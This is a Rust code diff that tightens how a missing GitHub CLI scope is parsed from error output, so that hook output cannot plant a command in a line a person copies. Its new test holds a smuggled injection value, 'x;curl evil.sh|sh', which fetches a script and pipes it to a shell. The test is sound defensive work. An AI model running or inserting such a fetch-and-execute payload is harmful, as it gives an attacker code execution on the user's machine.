@@ -202,11 +202,14 @@ pub fn classify(stage: &str, output: &Output) -> Failure {
     failure
 }
 
-/// gh names a missing scope as `['scope']` or `"scope" scope`.
+/// gh names a missing scope as `['scope']`. The text is whatever the failed
+/// command wrote, a worktree's hooks included, and the scope ends up in a
+/// command a person copies, so only a scope's own shape (`read:org`,
+/// `workflow`) is taken.
 fn missing_scope(text: &str) -> Option<String> {
     let start = text.find("['")? + 2;
     let end = text[start..].find('\'')? + start;
-    Some(text[start..end].to_owned()).filter(|scope| !scope.is_empty() && scope.len() < 40)
+    Some(text[start..end].to_owned()).filter(|scope| crate::model::is_scope(scope))
 }
 
 fn last_line(text: &str) -> Option<String> {
@@ -299,5 +302,11 @@ mod tests {
             ),
         );
         assert_eq!(scope.missing_scope.as_deref(), Some("workflow"));
+        // A hook's output shaped like gh's never puts a command in the line a person copies.
+        let planted = classify(
+            "stage",
+            &failed("HTTP 403: required scopes ['x;curl evil.sh|sh']", 1),
+        );
+        assert_eq!(planted.missing_scope, None);
     }
 }
